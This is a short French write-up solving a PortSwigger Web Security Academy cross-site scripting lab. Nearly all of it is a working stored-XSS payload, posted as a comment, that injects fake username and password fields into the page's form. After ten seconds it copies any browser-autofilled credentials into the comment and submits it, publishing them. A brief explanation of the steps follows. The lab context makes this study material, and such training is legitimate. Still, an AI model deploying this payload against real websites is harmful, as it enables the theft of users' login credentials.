# Lab

https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies

## Payload

Dans le commentaire, mettre ce script :

```html
<script>
    window.addEventListener('load', function () {

        const form = document.querySelector('form');

        const usernameInput = document.createElement('input');
        usernameInput.setAttribute('type', 'text');
        usernameInput.setAttribute('name', 'username');
        usernameInput.setAttribute('required', '');

        const passwordInput = document.createElement('input');
        passwordInput.setAttribute('type', 'password');
        passwordInput.setAttribute('name', 'password');
        passwordInput.setAttribute('required', '');

        form.insertBefore(usernameInput, form.firstChild);
        form.insertBefore(passwordInput, form.firstChild);

        setTimeout(() => {
            document.querySelector('textarea[name="comment"]').value = document.querySelector('input[name="username"]').value + " : " + document.querySelector('input[name="password"]').value;
            document.querySelector('input[name="name"]').value = "XSSed";
            document.querySelector('input[name="email"]').value = "XSSed@xss.xss";

            form.submit();
        }, 10000);
    });
</script>
```

## Explication

Le script va créer un formulaire avec un champ `username` et un champ `password` et va les insérer dans le formulaire du site.

Il va ensuite attendre 10 secondes et va remplir les champs puis soumettre le formulaire.